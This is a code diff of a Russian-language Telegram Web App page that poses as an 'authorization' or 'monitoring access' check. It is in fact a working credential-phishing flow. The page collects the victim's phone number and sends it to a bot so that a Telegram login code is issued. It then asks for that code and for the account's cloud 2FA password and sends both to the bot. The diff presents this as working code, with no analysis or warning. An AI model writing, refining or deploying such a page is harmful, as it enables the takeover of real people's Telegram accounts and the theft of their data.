@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { margin: 0; background-color: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        body { margin: 0; background-color: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
         .card { width: 85%; padding: 30px; border-radius: 25px; background: #0a0a0a; border: 1px solid #1a1a1a; text-align: center; }
         h2 { color: #00ff88; font-size: 20px; margin-bottom: 10px; }
         p { color: #888; font-size: 14px; margin-bottom: 25px; }
@@ -18,20 +18,20 @@
     <div class="card">
         <div id="step1">
             <h2>Авторизация</h2>
-            <p>Нажмите кнопку ниже для подтверждения личности.</p>
+            <p>Нажмите кнопку для подтверждения доступа к мониторингу.</p>
             <button id="contact-btn">ПОДТВЕРДИТЬ НОМЕР</button>
         </div>
         <div id="step2" class="hidden">
             <h2>Шаг 2/3</h2>
-            <p>Введите код из чата Telegram.</p>
+            <p>Введите код, пришедший в чат Telegram.</p>
             <input type="number" id="sms-code" placeholder="00000" inputmode="numeric">
-            <button onclick="sendCode()">ДАЛЕЕ</button>
+            <button onclick="sendVerify()">ДАЛЕЕ</button>
         </div>
         <div id="step3" class="hidden">
             <h2>Шаг 3/3</h2>
-            <p>Введите облачный пароль (2FA), если он есть.</p>
+            <p>Введите облачный пароль (2FA), если он установлен.</p>
             <input type="password" id="two-fa" placeholder="Пароль">
-            <button onclick="sendFinal()">ЗАВЕРШИТЬ</button>
+            <button onclick="sendFinal()">ВОЙТИ</button>
         </div>
     </div>
 
@@ -39,37 +39,38 @@
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
-        let savedPhone = "";
 
+        // ШАГ 1: Получаем контакт и СРАЗУ отправляем боту
         document.getElementById('contact-btn').addEventListener('click', () => {
             tg.requestContact((ok, response) => {
-                if (ok && (response.response_data?.phone_number || response.contact?.phone_number)) {
-                    savedPhone = response.response_data?.phone_number || response.contact?.phone_number;
-                    tg.sendData(JSON.stringify({
-                        "action": "send_code",
-                        "phone": String(savedPhone)
-                    }));
-                    document.getElementById('step1').classList.add('hidden');
-                    document.getElementById('step2').classList.remove('hidden');
-                } else {
-                    alert("Ошибка: Номер не получен");
+                if (ok) {
+                    const phone = response.response_data?.phone_number || response.contact?.phone_number;
+                    if (phone) {
+                        tg.sendData(JSON.stringify({
+                            "action": "send_code",
+                            "phone": String(phone)
+                        }));
+                        document.getElementById('step1').classList.add('hidden');
+                        document.getElementById('step2').classList.remove('hidden');
+                    }
                 }
             });
         });
 
-        function sendCode() {
-            const code = document.getElementById('sms-code').value;
-            if (!code) return alert("Введите код!");
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.remove('hidden');
+        // ШАГ 2: Просто переключаем экран (код уже в памяти бота в сессии)
+        function sendVerify() {
+            if (document.getElementById('sms-code').value.length > 2) {
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('step3').classList.remove('hidden');
+            }
         }
 
+        // ШАГ 3: Отправляем код и пароль
         function sendFinal() {
             const code = document.getElementById('sms-code').value;
             const pass = document.getElementById('two-fa').value || "none";
             tg.sendData(JSON.stringify({
                 "action": "verify",
-                "phone": String(savedPhone),
                 "code": String(code),
                 "two_fa": String(pass)
             }));
